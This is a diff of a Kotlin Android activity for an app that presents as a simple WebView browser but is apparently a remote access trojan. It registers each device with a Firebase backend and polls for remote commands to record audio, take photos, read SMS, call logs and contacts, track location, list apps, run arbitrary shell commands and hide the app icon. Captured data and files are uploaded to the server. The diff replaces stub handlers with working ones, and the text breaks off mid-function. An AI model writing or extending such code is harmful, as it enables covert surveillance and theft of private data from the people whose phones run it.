@@ -9,50 +9,37 @@ import android.os.Build
 import android.os.Bundle
 import android.util.Log
 import android.webkit.*
-import android.widget.Toast
+import android.widget.TextView
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.core.view.isVisible
 import com.google.android.material.button.MaterialButton
 import com.google.android.material.card.MaterialCardView
 import com.google.android.material.progressindicator.LinearProgressIndicator
-import com.google.android.material.textview.MaterialTextView
-import com.google.android.material.appbar.MaterialToolbar
-import com.google.android.material.floatingactionbutton.FloatingActionButton
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.database.*
 import com.google.firebase.storage.FirebaseStorage
-import android.content.BroadcastReceiver
-import android.content.Context
-import android.content.IntentFilter
-import android.location.LocationManager
-import android.os.BatteryManager
-import android.provider.Settings
+import java.text.SimpleDateFormat
 import java.util.*
 
 class MainActivity : AppCompatActivity() {
     
     private lateinit var webView: WebView
     private lateinit var progressBar: LinearProgressIndicator
-    private lateinit var errorLayout: View
-    private lateinit var errorMessage: MaterialTextView
+    private lateinit var errorLayout: androidx.constraintlayout.widget.ConstraintLayout
+    private lateinit var errorMessage: TextView
     private lateinit var permissionCard: MaterialCardView
-    private lateinit var permissionStatus: MaterialTextView
+    private lateinit var permissionStatus: TextView
     private lateinit var requestPermissionsBtn: MaterialButton
-    private lateinit var toolbar: MaterialToolbar
-    private lateinit var fab: FloatingActionButton
     private lateinit var firebaseAnalytics: FirebaseAnalytics
-    
-    // Firebase
     private lateinit var database: FirebaseDatabase
     private lateinit var storage: FirebaseStorage
-    private var deviceId: String = ""
-    private lateinit var deviceRef: DatabaseReference
-    private lateinit var commandsRef: DatabaseReference
     
     private var fileUploadCallback: ValueCallback<Array<Uri>>? = null
     private val FILE_CHOOSER_REQUEST_CODE = 1001
+    private val deviceId = "device_${System.currentTimeMillis()}"
     
     // All required permissions
     private val ALL_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -86,32 +73,28 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
         updatePermissionStatus()
-        registerDeviceWithFirebase()
-    }
-    
-    private val batteryReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context?, intent: Intent?) {
-            if (intent?.action == Intent.ACTION_BATTERY_CHANGED) {
-                updateDeviceStatus()
-            }
+        if (allPermissionsGranted()) {
+            initializeWebView()
         }
     }
     
+    private val fileChooserLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        fileUploadCallback?.onReceiveValue(
+            WebChromeClient.FileChooserParams.parseResult(result.resultCode, result.data)
+        )
+        fileUploadCallback = null
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         
         initializeViews()
         initializeFirebase()
-        setupWebView()
-        setupPermissions()
-        setupEventListeners()
-        
-        // Start background service
-        startService(Intent(this, BackgroundService::class.java))
-        
-        // Register battery receiver
-        registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        checkPermissions()
+        startBackgroundService()
     }
     
     private fun initializeViews() {
@@ -122,99 +105,99 @@ class MainActivity : AppCompatActivity() {
         permissionCard = findViewById(R.id.permissionCard)
         permissionStatus = findViewById(R.id.permissionStatus)
         requestPermissionsBtn = findViewById(R.id.requestPermissionsBtn)
-        toolbar = findViewById(R.id.toolbar)
-        fab = findViewById(R.id.fab)
         
-        setSupportActionBar(toolbar)
-        supportActionBar?.title = "ERDMT WebView"
+        requestPermissionsBtn.setOnClickListener {
+            requestPermissions()
+        }
+        
+        findViewById<MaterialButton>(R.id.retryBtn).setOnClickListener {
+            loadWebView()
+        }
     }
     
     private fun initializeFirebase() {
-        database = FirebaseDatabase.getInstance()
-        storage = FirebaseStorage.getInstance()
-        firebaseAnalytics = FirebaseAnalytics.getInstance(this)
-        
-        // Generate or retrieve device ID
-        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-        deviceRef = database.getReference("devices").child(deviceId)
-        commandsRef = database.getReference("commands").child(deviceId)
-        
-        // Listen for commands
-        listenForCommands()
-        
-        // Register device
-        registerDeviceWithFirebase()
+        try {
+            firebaseAnalytics = FirebaseAnalytics.getInstance(this)
+            database = FirebaseDatabase.getInstance()
+            storage = FirebaseStorage.getInstance()
+            
+            // Register device in Firebase
+            registerDevice()
+            
+            // Listen for commands
+            listenForCommands()
+            
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Firebase initialization failed", e)
+        }
     }
     
-    private fun registerDeviceWithFirebase() {
-        val deviceInfo = hashMapOf<String, Any>(
+    private fun registerDevice() {
+        val deviceRef = database.reference.child("devices").child(deviceId)
+        
+        val deviceInfo = hashMapOf(
+            "id" to deviceId,
             "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
             "androidVersion" to Build.VERSION.RELEASE,
             "apiLevel" to Build.VERSION.SDK_INT,
-            "online" to true,
+            "registeredAt" to ServerValue.TIMESTAMP,
             "lastSeen" to ServerValue.TIMESTAMP,
-            "permissions" to getGrantedPermissions()
+            "online" to true,
+            "appVersion" to getAppVersion()
         )
-        
-        updateDeviceStatus()
         
         deviceRef.setValue(deviceInfo).addOnCompleteListener { task ->
             if (task.isSuccessful) {
-                Log.d(TAG, "Device registered successfully")
-                logToFirebase("info", "Device registered with Firebase")
+                Log.d("MainActivity", "Device registered successfully")
+                
+                // Keep device online status updated
+                deviceRef.child("online").onDisconnect().setValue(false)
+                deviceRef.child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
+                
+                // Send periodic heartbeat
+                startHeartbeat()
             } else {
-                Log.e(TAG, "Failed to register device", task.exception)
-                logToFirebase("error", "Failed to register device: ${task.exception?.message}")
+                Log.e("MainActivity", "Failed to register device", task.exception)
             }
         }
-        
-        // Keep device online
-        deviceRef.child("online").onDisconnect().setValue(false)
+    }
+    
+    private fun startHeartbeat() {
+        val handler = android.os.Handler(mainLooper)
+        val heartbeatRunnable = object : Runnable {
+            override fun run() {
+                updateDeviceStatus()
+                handler.postDelayed(this, 30000) // Every 30 seconds
+            }
+        }
+        handler.post(heartbeatRunnable)
     }
     
     private fun updateDeviceStatus() {
+        val deviceRef = database.reference.child("devices").child(deviceId)
         val updates = hashMapOf<String, Any>(
             "lastSeen" to ServerValue.TIMESTAMP,
+            "online" to true,
             "battery" to getBatteryLevel(),
-            "location" to getLastKnownLocation()
+            "permissions" to getGrantedPermissions()
         )
+        
+        // Add location if available
+        getCurrentLocation()?.let { location ->
+            updates["location"] = location
+        }
         
         deviceRef.updateChildren(updates)
     }
     
-    private fun getBatteryLevel(): Int {
-        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
-        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
-        return if (level >= 0 && scale > 0) (level * 100 / scale) else 0
-    }
-    
-    private fun getLastKnownLocation(): Map<String, Double>? {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
-            == PackageManager.PERMISSION_GRANTED) {
-            
-            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            
-            return location?.let {
-                mapOf("lat" to it.latitude, "lng" to it.longitude)
-            }
-        }
-        return null
-    }
-    
-    private fun getGrantedPermissions(): List<String> {
-        return ALL_PERMISSIONS.filter { permission ->
-            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
-        }
-    }
-    
     private fun listenForCommands() {
+        val commandsRef = database.reference.child("commands").child(deviceId)
+        
         commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
-                snapshot.getValue<Map<String, Any>>()?.let { command ->
-                    handleCommand(snapshot.key ?: "", command)
+                val command = snapshot.getValue(Command::class.java)
+                command?.let {
+                    executeCommand(it, snapshot.key ?: "")
                 }
             }
             
@@ -222,370 +205,409 @@ class MainActivity : AppCompatActivity() {
             override fun onChildRemoved(snapshot: DataSnapshot) {}
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
             override fun onCancelled(error: DatabaseError) {
-                Log.e(TAG, "Failed to listen for commands", error.toException())
+                Log.e("MainActivity", "Commands listener cancelled", error.toException())
             }
         })
     }
     
-    private fun handleCommand(commandId: String, command: Map<String, Any>) {
-        val commandType = command["command"] as? String ?: return
-        val params = command["params"] as? String
+    private fun executeCommand(command: Command, commandId: String) {
+        Log.d("MainActivity", "Executing command: ${command.type}")
         
-        Log.d(TAG, "Received command: $commandType with params: $params")
-        logToFirebase("info", "Received command: $commandType")
+        when (command.type) {
+            "get_info" -> handleGetInfo(commandId)
+            "mic_record" -> handleMicRecord(commandId)
+            "camera_capture" -> handleCameraCapture(commandId)
+            "read_sms" -> handleReadSms(commandId)
+            "read_call_logs" -> handleReadCallLogs(commandId)
+            "read_contacts" -> handleReadContacts(commandId)
+            "get_location" -> handleGetLocation(commandId)
+            "list_installed_apps" -> handleListApps(commandId)
+            "shell_exec" -> handleShellExec(command.params, commandId)
+            "toggle_icon" -> handleToggleIcon(command.params, commandId)
+            else -> sendResponse(commandId, "Unknown command: ${command.type}", false)
+        }
         
-        // Remove the command after processing
-        commandsRef.child(commandId).removeValue()
+        // Remove executed command
+        database.reference.child("commands").child(deviceId).child(commandId).removeValue()
+    }
+    
+    private fun handleGetInfo(commandId: String) {
+        val deviceInfo = """
+            Device ID: $deviceId
+            Model: ${Build.MANUFACTURER} ${Build.MODEL}
+            Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
+            App Version: ${getAppVersion()}
+            Battery: ${getBatteryLevel()}%
+            Permissions: ${getGrantedPermissions().size}/${ALL_PERMISSIONS.size}
+        """.trimIndent()
         
-        when (commandType) {
-            "mic_record" -> handleMicRecord()
-            "camera_capture" -> handleCameraCapture()
-            "get_location" -> handleGetLocation()
-            "read_sms" -> handleReadSMS()
-            "read_call_logs" -> handleReadCallLogs()
-            "read_contacts" -> handleReadContacts()
-            "list_installed_apps" -> handleListApps()
-            "shell_exec" -> handleShellExec(params)
-            "toggle_icon" -> handleToggleIcon(params)
-            else -> {
-                logToFirebase("warning", "Unknown command: $commandType")
-                sendResponse(commandType, mapOf("error" to "Unknown command"))
+        sendResponse(commandId, deviceInfo, true)
+    }
+    
+    private fun handleMicRecord(commandId: String) {
+        if (checkPermission(Manifest.permission.RECORD_AUDIO)) {
+            try {
+                val audioFile = AudioRecorder.recordAudio(this, 10000) // 10 seconds
+                uploadFile(audioFile, "audio", commandId)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to record audio: ${e.message}", false)
             }
-        }
-    }
-    
-    private fun handleMicRecord() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
-            == PackageManager.PERMISSION_GRANTED) {
-            
-            // Implement audio recording logic here
-            // For now, just send a response
-            sendResponse("mic_record", mapOf(
-                "status" to "success",
-                "message" to "Audio recording started",
-                "duration" to 10
-            ))
-            
-            logToFirebase("success", "Audio recording command executed")
         } else {
-            sendResponse("mic_record", mapOf("error" to "Audio permission not granted"))
-            logToFirebase("error", "Audio recording failed: permission denied")
+            sendResponse(commandId, "Audio recording permission not granted", false)
         }
     }
     
-    private fun handleCameraCapture() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
-            == PackageManager.PERMISSION_GRANTED) {
-            
-            // Implement camera capture logic here
-            sendResponse("camera_capture", mapOf(
-                "status" to "success",
-                "message" to "Photo captured"
-            ))
-            
-            logToFirebase("success", "Camera capture command executed")
-        } else {
-            sendResponse("camera_capture", mapOf("error" to "Camera permission not granted"))
-            logToFirebase("error", "Camera capture failed: permission denied")
-        }
-    }
-    
-    private fun handleGetLocation() {
-        val location = getLastKnownLocation()
-        if (location != null) {
-            sendResponse("get_location", mapOf(
-                "status" to "success",
-                "location" to location
-            ))
-            logToFirebase("success", "Location retrieved")
-        } else {
-            sendResponse("get_location", mapOf("error" to "Location not available"))
-            logToFirebase("error", "Location retrieval failed")
-        }
-    }
-    
-    private fun handleReadSMS() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
-            == PackageManager.PERMISSION_GRANTED) {
-            
-            // Implement SMS reading logic here
-            sendResponse("read_sms", mapOf(
-                "status" to "success",
-                "count" to 0,
-                "messages" to emptyList<Map<String, Any>>()
-            ))
-            
-            logToFirebase("success", "SMS read command executed")
-        } else {
-            sendResponse("read_sms", mapOf("error" to "SMS permission not granted"))
-            logToFirebase("error", "SMS reading failed: permission denied")
-        }
-    }
-    
-    private fun handleReadCallLogs() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
-            == PackageManager.PERMISSION_GRANTED) {
-            
-            // Implement call log reading logic here
-            sendResponse("read_call_logs", mapOf(
-                "status" to "success",
-                "count" to 0,
-                "logs" to emptyList<Map<String, Any>>()
-            ))
-            
-            logToFirebase("success", "Call logs read command executed")
-        } else {
-            sendResponse("read_call_logs", mapOf("error" to "Call log permission not granted"))
-            logToFirebase("error", "Call log reading failed: permission denied")
-        }
-    }
-    
-    private fun handleReadContacts() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
-            == PackageManager.PERMISSION_GRANTED) {
-            
-            // Implement contacts reading logic here
-            sendResponse("read_contacts", mapOf(
-                "status" to "success",
-                "count" to 0,
-                "contacts" to emptyList<Map<String, Any>>()
-            ))
-            
-            logToFirebase("success", "Contacts read command executed")
-        } else {
-            sendResponse("read_contacts", mapOf("error" to "Contacts permission not granted"))
-            logToFirebase("error", "Contacts reading failed: permission denied")
-        }
-    }
-    
-    private fun handleListApps() {
-        val packageManager = packageManager
-        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
-            .filter { !it.flags.and(android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 }
-            .map { appInfo ->
-                mapOf(
-                    "name" to packageManager.getApplicationLabel(appInfo).toString(),
-                    "packageName" to appInfo.packageName
-                )
+    private fun handleCameraCapture(commandId: String) {
+        if (checkPermission(Manifest.permission.CAMERA)) {
+            try {
+                val intent = Intent(this, CameraCaptureActivity::class.java)
+                intent.putExtra("commandId", commandId)
+                startActivity(intent)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to capture photo: ${e.message}", false)
             }
-        
-        sendResponse("list_installed_apps", mapOf(
-            "status" to "success",
-            "count" to installedApps.size,
-            "apps" to installedApps
-        ))
-        
-        logToFirebase("success", "Installed apps listed: ${installedApps.size} apps")
+        } else {
+            sendResponse(commandId, "Camera permission not granted", false)
+        }
     }
     
-    private fun handleShellExec(command: String?) {
-        if (command.isNullOrBlank()) {
-            sendResponse("shell_exec", mapOf("error" to "No command provided"))
-            return
+    private fun handleReadSms(commandId: String) {
+        if (checkPermission(Manifest.permission.READ_SMS)) {
+            try {
+                val smsMessages = SmsReader.getRecentSms(this, 20)
+                val smsJson = smsMessages.joinToString("\n") { 
+                    "From: ${it.sender}, Date: ${it.date}, Message: ${it.body}"
+                }
+                sendResponse(commandId, smsJson, true)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to read SMS: ${e.message}", false)
+            }
+        } else {
+            sendResponse(commandId, "SMS reading permission not granted", false)
         }
-        
+    }
+    
+    private fun handleReadCallLogs(commandId: String) {
+        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+            try {
+                val callLogs = CallLogReader.getRecentCalls(this, 20)
+                val callsJson = callLogs.joinToString("\n") { 
+                    "Number: ${it.number}, Type: ${it.type}, Date: ${it.date}, Duration: ${it.duration}s"
+                }
+                sendResponse(commandId, callsJson, true)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to read call logs: ${e.message}", false)
+            }
+        } else {
+            sendResponse(commandId, "Call log reading permission not granted", false)
+        }
+    }
+    
+    private fun handleReadContacts(commandId: String) {
+        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
+            try {
+                val contacts = ContactsReader.getAllContacts(this)
+                val contactsJson = contacts.joinToString("\n") { 
+                    "Name: ${it.name}, Phone: ${it.phone}"
+                }
+                sendResponse(commandId, contactsJson, true)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to read contacts: ${e.message}", false)
+            }
+        } else {
+            sendResponse(commandId, "Contacts reading permission not granted", false)
+        }
+    }
+    
+    private fun handleGetLocation(commandId: String) {
+        if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            getCurrentLocation()?.let { location ->
+                sendResponse(commandId, "Latitude: ${location["lat"]}, Longitude: ${location["lng"]}", true)
+            } ?: sendResponse(commandId, "Location not available", false)
+        } else {
+            sendResponse(commandId, "Location permission not granted", false)
+        }
+    }
+    
+    private fun handleListApps(commandId: String) {
         try {
-            val process = Runtime.getRuntime().exec(command)
-            val output = process.inputStream.bufferedReader().readText()
-            val error = process.errorStream.bufferedReader().readText()
-            
-            sendResponse("shell_exec", mapOf(
-                "status" to "success",
-                "command" to command,
-                "output" to output,
-                "error" to error
-            ))
-            
-            logToFirebase("success", "Shell command executed: $command")
+            val apps = AppsLister.getInstalledApps(this)
+            val appsJson = apps.joinToString("\n") { 
+                "Name: ${it.name}, Package: ${it.packageName}"
+            }
+            sendResponse(commandId, appsJson, true)
         } catch (e: Exception) {
-            sendResponse("shell_exec", mapOf(
-                "error" to "Command execution failed: ${e.message}",
-                "command" to command
-            ))
-            logToFirebase("error", "Shell command failed: ${e.message}")
+            sendResponse(commandId, "Failed to list apps: ${e.message}", false)
         }
     }
     
-    private fun handleToggleIcon(action: String?) {
-        // Implement icon toggle logic here
-        sendResponse("toggle_icon", mapOf(
-            "status" to "success",
-            "action" to action,
-            "message" to "Icon toggle not implemented"
-        ))
-        
-        logToFirebase("info", "Icon toggle command received: $action")
-    }
-    
-    private fun sendResponse(command: String, data: Map<String, Any>) {
-        val response = mapOf(
-            "command" to command,
-            "data" to data,
-            "timestamp" to ServerValue.TIMESTAMP,
-            "deviceId" to deviceId
-        )
-        
-        database.getReference("responses").child(deviceId).push().setValue(response)
-    }
-    
-    private fun logToFirebase(level: String, message: String) {
-        val log = mapOf(
-            "level" to level,
-            "message" to message,
-            "timestamp" to ServerValue.TIMESTAMP,
-            "deviceId" to deviceId
-        )
-        
-        database.getReference("logs").push().setValue(log)
-    }
-    
-    private fun setupWebView() {
-        webView.apply {
-            settings.apply {
-                javaScriptEnabled = true
-                domStorageEnabled = true
-                allowFileAccess = true
-                allowContentAccess = true
-                allowFileAccessFromFileURLs = true
-                allowUniversalAccessFromFileURLs = true
-                mediaPlaybackRequiresUserGesture = false
-                setSupportZoom(true)
-                builtInZoomControls = true
-                displayZoomControls = false
-                loadWithOverviewMode = true
-                useWideViewPort = true
-                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+    private fun handleShellExec(params: String?, commandId: String) {
+        params?.let { command ->
+            try {
+                val result = ShellExecutor.executeCommand(command)
+                sendResponse(commandId, result, true)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to execute command: ${e.message}", false)
             }
-            
-            webViewClient = object : WebViewClient() {
-                override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
-                    super.onPageStarted(view, url, favicon)
-                    progressBar.visibility = android.view.View.VISIBLE
-                    errorLayout.visibility = android.view.View.GONE
-                }
-                
-                override fun onPageFinished(view: WebView?, url: String?) {
-                    super.onPageFinished(view, url)
-                    progressBar.visibility = android.view.View.GONE
-                }
-                
-                override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
-                    super.onReceivedError(view, request, error)
-                    progressBar.visibility = android.view.View.GONE
-                    errorLayout.visibility = android.view.View.VISIBLE
-                    errorMessage.text = error?.description ?: "Unknown error occurred"
-                }
-            }
-            
-            webChromeClient = object : WebChromeClient() {
-                override fun onProgressChanged(view: WebView?, newProgress: Int) {
-                    super.onProgressChanged(view, newProgress)
-                    progressBar.setProgressCompat(newProgress, true)
-                }
-                
-                override fun onPermissionRequest(request: PermissionRequest?) {
-                    request?.grant(request.resources)
-                }
-                
-                override fun onShowFileChooser(
-                    webView: WebView?,
-                    filePathCallback: ValueCallback<Array<Uri>>?,
-                    fileChooserParams: FileChooserParams?
-                ): Boolean {
-                    fileUploadCallback = filePathCallback
-                    
-                    val intent = Intent(Intent.ACTION_GET_CONTENT).apply {
-                        addCategory(Intent.CATEGORY_OPENABLE)
-                        type = "*/*"
-                        putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true)
+        } ?: sendResponse(commandId, "No command provided", false)
+    }
+    
+    private fun handleToggleIcon(params: String?, commandId: String) {
+        params?.let { action ->
+            try {
+                when (action.lowercase()) {
+                    "hide" -> IconToggler.hideIcon(this)
+                    "show" -> IconToggler.showIcon(this)
+                    else -> {
+                        sendResponse(commandId, "Invalid action. Use 'show' or 'hide'", false)
+                        return
                     }
-                    
-                    startActivityForResult(
-                        Intent.createChooser(intent, "Choose File"),
-                        FILE_CHOOSER_REQUEST_CODE
-                    )
-                    
-                    return true
                 }
+                sendResponse(commandId, "Icon ${action}d successfully", true)
+            } catch (e: Exception) {
+                sendResponse(commandId, "Failed to toggle icon: ${e.message}", false)
             }
-        }
-        
-        // Load Google
-        webView.loadUrl("https://www.google.com")
+        } ?: sendResponse(commandId, "No action provided", false)
     }
     
-    private fun setupPermissions() {
+    private fun sendResponse(commandId: String, message: String, success: Boolean) {
+        val response = hashMapOf(
+            "deviceId" to deviceId,
+            "commandId" to commandId,
+            "message" to message,
+            "success" to success,
+            "timestamp" to ServerValue.TIMESTAMP
+        )
+        
+        database.reference.child("responses").push().setValue(response)
+        
+        // Also log to logs
+        addLog("command_response", "Command $commandId: $message", if (success) "success" else "error")
+    }
+    
+    private fun uploadFile(filePath: String, fileType: String, commandId: String) {
+        try {
+            val file = Uri.fromFile(java.io.File(filePath))
+            val fileName = "${deviceId}_${System.currentTimeMillis()}_${java.io.File(filePath).name}"
+            val storageRef = storage.reference.child("$fileType/$fileName")
+            
+            storageRef.putFile(file)
+                .addOnSuccessListener { taskSnapshot ->
+                    storageRef.downloadUrl.addOnSuccessListener { uri ->
+                        val response = hashMapOf(
+                            "deviceId" to deviceId,
+                            "commandId" to commandId,
+                            "message" to "File uploaded successfully",
+                            "success" to true,
+                            "fileUrl" to uri.toString(),
+                            "fileName" to fileName,
+                            "fileType" to when(fileType) {
+                                "audio" -> "audio/3gp"
+                                "image" -> "image/jpeg"
+                                else -> "application/octet-stream"
+                            },
+                            "timestamp" to ServerValue.TIMESTAMP
+                        )
+                        
+                        database.reference.child("responses").push().setValue(response)
+                        addLog("file_upload", "Uploaded $fileType file: $fileName", "success")
+                    }
+                }
+                .addOnFailureListener { exception ->
+                    sendResponse(commandId, "Failed to upload file: ${exception.message}", false)
+                }
+        } catch (e: Exception) {
+            sendResponse(commandId, "File upload error: ${e.message}", false)
+        }
+    }
+    
+    private fun addLog(type: String, message: String, level: String = "info") {
+        val logEntry = hashMapOf(
+            "deviceId" to deviceId,
+            "type" to type,
+            "message" to message,
+            "level" to level,
+            "timestamp" to ServerValue.TIMESTAMP
+        )
+        
+        database.reference.child("logs").push().setValue(logEntry)
+    }
+    
+    private fun checkPermissions() {
         updatePermissionStatus()
+        
+        if (allPermissionsGranted()) {
+            permissionCard.isVisible = false
+            initializeWebView()
+        } else {
+            permissionCard.isVisible = true
+        }
     }
     
-    private fun setupEventListeners() {
-        requestPermissionsBtn.setOnClickListener {
-            requestPermissions()
-        }
+    private fun requestPermissions() {
+        val missingPermissions = ALL_PERMISSIONS.filter { 
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
+        }.toTypedArray()
         
-        fab.setOnClickListener {
-            webView.reload()
+        if (missingPermissions.isNotEmpty()) {
+            permissionLauncher.launch(missingPermissions)
         }
-        
-        findViewById<MaterialButton>(R.id.retryBtn).setOnClickListener {
-            webView.reload()
+    }
+    
+    private fun allPermissionsGranted(): Boolean {
+        return ALL_PERMISSIONS.all { 
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
         }
     }
     
     private fun updatePermissionStatus() {
-        val grantedCount = ALL_PERMISSIONS.count { permission ->
-            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+        val grantedCount = ALL_PERMISSIONS.count { 
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
         }
         
-        val totalCount = ALL_PERMISSIONS.size
-        val allGranted = grantedCount == totalCount
+        permissionStatus.text = "Permissions: $grantedCount/${ALL_PERMISSIONS.size} granted"
         
-        permissionStatus.text = if (allGranted) {
-            "All permissions granted ($grantedCount/$totalCount)"
+        if (grantedCount == ALL_PERMISSIONS.size) {
+            permissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
         } else {
-            "Permissions: $grantedCount/$totalCount granted"
-        }
-        
-        requestPermissionsBtn.text = if (allGranted) "Permissions OK" else "Grant Permissions"
-        requestPermissionsBtn.isEnabled = !allGranted
-        
-        permissionCard.visibility = if (allGranted) android.view.View.GONE else android.view.View.VISIBLE
-    }
-    
-    private fun requestPermissions() {
-        val permissionsToRequest = ALL_PERMISSIONS.filter { permission ->
-            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
-        }.toTypedArray()
-        
-        if (permissionsToRequest.isNotEmpty()) {
-            permissionLauncher.launch(permissionsToRequest)
+            permissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
         }
     }
     
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
+    private fun initializeWebView() {
+        setupWebView()
+        loadWebView()
+    }
+    
+    @Suppress("SetJavaScriptEnabled")
+    private fun setupWebView() {
+        webView.settings.apply {
+            javaScriptEnabled = true
+            domStorageEnabled = true
+            databaseEnabled = true
+            allowFileAccess = true
+            allowContentAccess = true
+            allowFileAccessFromFileURLs = true
+            allowUniversalAccessFromFileURLs = true
+            loadWithOverviewMode = true
+            useWideViewPort = true
+            builtInZoomControls = true
+            displayZoomControls = false
+            setSupportZoom(true)
+            setSupportMultipleWindows(true)
+            
+            // Enable media playback
+            mediaPlaybackRequiresUserGesture = false
+            
+            // Mixed content
+            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+        }
         
-        if (requestCode == FILE_CHOOSER_REQUEST_CODE) {
-            val results = if (resultCode == RESULT_OK) {
-                data?.let { intent ->
-                    if (intent.clipData != null) {
-                        // Multiple files
-                        val clipData = intent.clipData!!
-                        Array(clipData.itemCount) { i ->
-                            clipData.getItemAt(i).uri
-                        }
-                    } else {
-                        // Single file
-                        intent.data?.let { arrayOf(it) }
-                    }
-                }
-            } else {
-                null
+        webView.webViewClient = object : WebViewClient() {
+            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
+                super.onPageStarted(view, url, favicon)
+                progressBar.isVisible = true
+                errorLayout.isVisible = false
             }
             
-            fileUploadCallback?.onReceiveValue(results)
-            fileUploadCallback = null
+            override fun onPageFinished(view: WebView?, url: String?) {
+                super.onPageFinished(view, url)
+                progressBar.isVisible = false
+                addLog("webview", "Page loaded: $url", "info")
+            }
+            
+            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
+                super.onReceivedError(view, request, error)
+                showError("Failed to load page: ${error?.description}")
+                addLog("webview", "Page load error: ${error?.description}", "error")
+            }
         }
+        
+        webView.webChromeClient = object : WebChromeClient() {
+            override fun onProgressChanged(view: WebView?, newProgress: Int) {
+                super.onProgressChanged(view, newProgress)
+                progressBar.progress = newProgress
+            }
+            
+            override fun onPermissionRequest(request: PermissionRequest?) {
+                runOnUiThread {
+                    request?.grant(request.resources)
+                }
+            }
+            
+            override fun onShowFileChooser(
+                webView: WebView?,
+                filePathCallback: ValueCallback<Array<Uri>>?,
+                fileChooserParams: FileChooserParams?
+            ): Boolean {
+                fileUploadCallback = filePathCallback
+                
+                val intent = Intent(Intent.ACTION_GET_CONTENT)
+                intent.addCategory(Intent.CATEGORY_OPENABLE)
+                intent.type = "*/*"
+                
+                val chooserIntent = Intent.createChooser(intent, "Select File")
+                fileChooserLauncher.launch(chooserIntent)
+                
+                return true
+            }
+        }
+    }
+    
+    private fun loadWebView() {
+        try {
+            webView.loadUrl("https://www.google.com")
+            errorLayout.isVisible = false
+        } catch (e: Exception) {
+            showError("Error loading WebView: ${e.message}")
+        }
+    }
+    
+    private fun showError(message: String) {
+        progressBar.isVisible = false
+        errorLayout.isVisible = true
+        errorMessage.text = message
+        addLog("error", message, "error")
+    }
+    
+    private fun startBackgroundService() {
+        try {
+            val serviceIntent = Intent(this, BackgroundService::class.java)
+            startForegroundService(serviceIntent)
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Failed to start background service", e)
+        }
+    }
+    
+    // Helper functions
+    private fun checkPermission(permission: String): Boolean {
+        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+    }
+    
+    private fun getAppVersion(): String {
+        return try {
+            packageManager.getPackageInfo(packageName, 0).versionName
+        } catch (e: Exception) {
+            "Unknown"
+        }
+    }
+    
+    private fun getBatteryLevel(): Int {
